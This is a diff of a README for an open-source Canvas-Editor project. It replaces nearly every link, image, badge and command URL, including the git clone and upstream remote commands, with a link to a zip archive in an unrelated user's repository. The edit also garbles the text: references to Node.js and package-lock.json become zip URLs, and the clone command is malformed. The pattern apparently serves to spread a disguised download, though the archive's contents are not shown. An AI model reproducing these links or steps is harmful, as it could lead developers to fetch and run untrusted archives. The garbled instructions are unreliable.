+git clone https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip<your-github-username>/Canvas-Editor
 ```
 
 **3.** Navigate to the new project directory:
@@ -296,7 +296,7 @@ cd Canvas-Editor
 **4.** Set upstream command:
 
 ```bash
-git remote add upstream https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip
+git remote add upstream https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip
 ```
 
 **5.** Create a new branch:
@@ -327,7 +327,7 @@ git fetch upstream
 git merge upstream/main
 ```
 
-### [Github Docs](https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip) for Syncing
+### [Github Docs](https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip) for Syncing
 
 **7.** Make your changes to the source code.
 
@@ -350,20 +350,20 @@ git commit -m "<your_commit_message>"
 git push origin YourBranchName
 ```
 
-**10.** Create a [Pull Request](https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip)!
+**10.** Create a [Pull Request](https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip)!
 
  **Congratulations! You've made your first contribution! 🙌🏼**
-<p align="right"><a href="#top"><img src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip%20to%20top-Blue?style=plastic" alt="Back To Top"></a></p>
+<p align="right"><a href="#top"><img src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip%20to%20top-Blue?style=plastic" alt="Back To Top"></a></p>
 
 <!--Line-->
-<img src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip" width="900"> 
+<img src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip" width="900"> 
 
  # Project Admin⚡
  
 <table>
 <tr>
-<td align="center"><a href="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip"><img src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip" width=150px height=150px /></a></br> <h4 style="color:red;">Anurag Vishwakarma</h4>
- <a href="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip"><img src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip" width="32px" height="32px"></img></a>
+<td align="center"><a href="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip"><img src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip" width=150px height=150px /></a></br> <h4 style="color:red;">Anurag Vishwakarma</h4>
+ <a href="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip"><img src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip" width="32px" height="32px"></img></a>
 </td>
 </tr>
 </table>
@@ -372,15 +372,15 @@ git push origin YourBranchName
  
 <table>
 <tr>
-<td align="center"><a href="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip"><img src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip" width=150px height=150px /></a></br> <h4 style="color:red;">Somyadip Ghosh</h4>
- <a href="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip"><img src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip" width="32px" height="32px"></img></a>
+<td align="center"><a href="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip"><img src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip" width=150px height=150px /></a></br> <h4 style="color:red;">Somyadip Ghosh</h4>
+ <a href="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip"><img src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip" width="32px" height="32px"></img></a>
 </td>
 </tr>
 </table>
 
 
 <!--Line-->
-<img src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip" width="900"> 
+<img src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip" width="900"> 
 
 ## Troubleshooting
 
@@ -389,9 +389,9 @@ git push origin YourBranchName
 1. **Installation Error: `npm install` fails**
    - **Symptoms:** Error messages during the installation process.
    - **Solution:** 
-     - Ensure you have the latest version of https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip and npm installed. You can check your versions using `node -v` and `npm -v`.
+     - Ensure you have the latest version of https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip and npm installed. You can check your versions using `node -v` and `npm -v`.
      - Clear the npm cache by running `npm cache clean --force`.
-     - Try deleting the `node_modules` folder and the `https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip` file, then rerun the installation with `npm install`.
+     - Try deleting the `node_modules` folder and the `https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip` file, then rerun the installation with `npm install`.
 
 2. **Wallet Connection Issues**
    - **Symptoms:** Unable to connect to MetaMask.
@@ -411,14 +411,14 @@ git push origin YourBranchName
 - Ensure that the `.env` file is properly configured with the necessary environment variables, including your Infura Project ID and wallet private key. 
 
 ### Development Environment
-- Make sure you are using https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip version **16.x.x** or **18.x.x** and that all required npm packages are installed. You can check your current https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip version using `node -v`.
+- Make sure you are using https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip version **16.x.x** or **18.x.x** and that all required npm packages are installed. You can check your current https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip version using `node -v`.
 
 ### Tips for Optimizing Performance
 - Minimize the number of unnecessary background tasks during deployment to improve efficiency.
 - Monitor gas fees closely and consider deploying during off-peak hours to reduce costs.
 
 ### Contact for Support
-If you encounter an issue not listed here, please reach out via [GitHub Issues](https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip).
+If you encounter an issue not listed here, please reach out via [GitHub Issues](https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip).
 
   
 ## Contributors
@@ -432,8 +432,8 @@ We look forward to your continued support and collaboration. Together, we can ac
 Thank you once again to all our contributors! Your efforts are truly appreciated. 💖👏
 
 <p align="center">
-      <a href="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip">
-         <img src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip" width="700" height="250" />
+      <a href="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip">
+         <img src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip" width="700" height="250" />
       </a>
 </p>
 
@@ -444,7 +444,7 @@ Thank you once again to all our contributors! Your efforts are truly appreciated
 
 <div align='center'>
 
-[![Stargazers repo roster for @vishanurag/Canvas-Editor](https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip)](https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip)
+[![Stargazers repo roster for @vishanurag/Canvas-Editor](https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip)](https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip)
 
 </div>
 
@@ -452,24 +452,24 @@ Thank you once again to all our contributors! Your efforts are truly appreciated
 
 <div align='center'>
 
-[![Forkers repo roster for @vishanurag/Canvas-Editor](https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip)](https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip)
+[![Forkers repo roster for @vishanurag/Canvas-Editor](https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip)](https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip)
 
 </div>
 
 ## 🌐 Connect with Me
 
 <div align="center">
-    <a href="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip">
-        <img src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip" alt="LinkedIn" width="100" height="30"/>
+    <a href="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip">
+        <img src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip" alt="LinkedIn" width="100" height="30"/>
     </a>
-    <a href="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip">
-        <img src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip" alt="Email" width="100" height="30"/>
+    <a href="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip">
+        <img src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip" alt="Email" width="100" height="30"/>
     </a>
-    <a href="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip">
-        <img src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip" alt="GitHub" width="100" height="30"/>
+    <a href="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip">
+        <img src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip" alt="GitHub" width="100" height="30"/>
     </a>
-    <a href="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip%2B917693993165&text&type=phone_number&app_absent=0">
-        <img src="https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip" alt="WhatsApp" width="100" height="30"/>
+    <a href="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip%2B917693993165&text&type=phone_number&app_absent=0">
+        <img src="https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip" alt="WhatsApp" width="100" height="30"/>
     </a>
 </div>
 
@@ -481,7 +481,7 @@ Thank you for visiting! Feel free to reach out through any of the links above.
 
 <div align="center">
 
-[![License: MIT](https://github.com/kaifansariw/Canvas-Editor/raw/refs/heads/main/.github/workflows/Editor-Canvas-v3.9.zip)](./LICENSE)
+[![License: MIT](https://raw.githubusercontent.com/kaifansariw/Canvas-Editor/main/src/Styles/Canvas_Editor_v2.1.zip)](./LICENSE)
 
 <br>
 This project is licensed under the terms of the <strong><a href="./LICENSE">MIT License</a></strong>. <br>
